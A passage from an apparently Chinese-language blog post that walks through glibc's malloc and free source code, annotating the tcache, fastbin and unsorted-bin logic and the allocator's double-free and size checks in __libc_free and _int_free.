&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//如果相应的large bin没有，则到更大的large bin中去取然后切割</span></span><br><span class="line">            找完了还找不到，<span class="keyword">goto</span> use_top</span><br><span class="line">        &#125;</span><br><span class="line">        use_top:</span><br><span class="line">        	<span class="keyword">if</span>(top chunk大小合适)</span><br><span class="line">        		切割</span><br><span class="line">                <span class="keyword">return</span> 指针</span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">if</span>(不合适，但是有fastchunks)</span><br><span class="line">                 malloc_consolidate合并堆块</span><br><span class="line">             <span class="keyword">else</span>: <span class="comment">//不合适，而且没有fastchunks</span></span><br><span class="line">        		sysmalloc分配</span><br><span class="line">                    <span class="keyword">return</span>指针</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>我们来看看这个free的过程，同样的，free是由<code>__libc_free</code>实现的,会调用<code>_int_free</code>。我们这里先看看<code>__libc_free</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Quickly check that the freed pointer matches the tag for the memory.</span></span><br><span class="line"><span class="comment">     This gives a useful double-free detection.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="keyword">char</span> *)mem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> err = errno;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">	 Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Mark the chunk as belonging to the library again.  */</span></span><br><span class="line">      (<span class="keyword">void</span>)tag_region (chunk2mem (p), memsize (p));</span><br><span class="line"></span><br><span class="line">      ar_ptr = arena_for_chunk (p);</span><br><span class="line">      _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __set_errno (err);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure>
<p>有个判断chunk是否是mmaped，如果不是则会进行一个Tcache初始化，然后调用<code>_int_free</code>。一般来说不是mmaped的，所以我们直接看<code>_int_free</code>好了。这个函数比较短，就300多行。</p>
<p>其实在<code>_int_free</code>中我们可以发现并没有直接放入small bin和large bin的操作，有的只有放unsorted bin以及tcache bin与fastbin。那么在哪里放的呢？其实就是前面分析过的<code>_int_malloc</code>过程，把放入unsorted bin中的chunk进行一个进一步整理，放入small bin以及large bin。</p>
<p>首先是一些声明以及检查的工作，这里主要检查的是指针合法性以及chunk头部字段是否正确</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后是tcache bin的逻辑，如果我们free的chunk大小在tcache bin范围内，就会有如下逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">        <span class="comment">//这是一种double free的检测。当chunk放入tcache bin的时候，key字段会被赋为tcache_key。所以key字段位置上是tcache_key的时候有可能会有double_free(只是有可能，因为也有可能用户的数据刚好就是tcache_key呢)</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    <span class="keyword">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)</span><br><span class="line">	      &#123;</span><br><span class="line">		<span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)<span class="comment">//tcache bin中元素不合理，过多了</span></span><br><span class="line">		  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))<span class="comment">//没有对齐</span></span><br><span class="line">		  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (tmp == e) <span class="comment">//double free检测，该bin上的某个链上已经有了e</span></span><br><span class="line">		  malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">		<span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">		   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">	      &#125;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">//tcache bin还没满，就放进去</span></span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>如果大小在fastbin范围内，则进行如下逻辑。首先是进行一系列检查，然后调用<code>free_perturb</code>清空之后，根据是否多线程选择相应的过程进行放入fastbin的操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">	bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">      ) &#123;</span><br><span class="line"><span class="comment">//进行一些判断</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">			  &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">	   getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (!have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">	    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= CHUNK_HDR_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">	    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fail)</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//清内容</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	   add (i.e., double free).  */</span></span><br><span class="line">        <span class="comment">//检查double free等</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">        <span class="comment">//把chunk链入 fastbin中</span></span><br><span class="line">	p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">	*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	     add (i.e., double free).  */</span></span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">      <span class="comment">//把chunk链入 fastbin中</span></span><br><span class="line">	  old2 = old;</span><br><span class="line">	  p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">	     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">	&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>然后如果大小不再fastbin中，并且也不是mmaped来的，进入到了<code>else if (!chunk_is_mmapped(p))</code>的逻辑</p>
<p>下面的是<code>else if (!chunk_is_mmapped(p))</code>范围里面的一些代码</p>
<p>首先还是进行一系列检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">      top block.  */</span></span><br><span class="line"> <span class="comment">//p是top chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">  <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="comment">//检查next chunk是否超过了arena的范围</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">      &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">      &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">  <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="comment">//检查next chunk的prev inuse</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="comment">//检查next chunk的size的合理性</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);</span><br></pre></td></tr></table></figure>
<p>然后根据该chunk的物理相邻前后chunk判断是否要进行合并操作。这里注意需要对后面的chunk是否为top chunk进行一个判断，如果是top chunk要合并到top chunk中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="comment">//如果前面的chunk是free状态的，则向前吞并chunk</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      <span class="comment">//把前面的chunk给unlink掉</span></span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//判断后面一个chunk是否为top chunk，如果不是则进入此分支</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果后面的chunk没有被使用，则unlink掉后面的chunk，然后增加size</span></span><br><span class="line">	unlink_chunk (av, nextchunk);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>); <span class="comment">//否则清除后面chunk的pre_inuse位</span></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">	not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">	been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"><span class="comment">//把合并(也有可能没合并)后的chunk放入unsorted bin中</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">    <span class="comment">//如果是large bin 范围的chunk，还需要设置fd_nextsize与bk_nextsize</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">	 <span class="keyword">else</span> &#123; <span class="comment">//如果后面的chunk是top chunk，则直接把当前chunk合并进top chunk</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>然后如果free的chunk的大小超过了<code>FASTBIN_CONSOLIDATION_THRESHOLD</code>这个阈值，并且arena中存在fastchunks，则会调用<code>malloc_consolidate</code> 对fastbin的chunk进行一个合并</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span 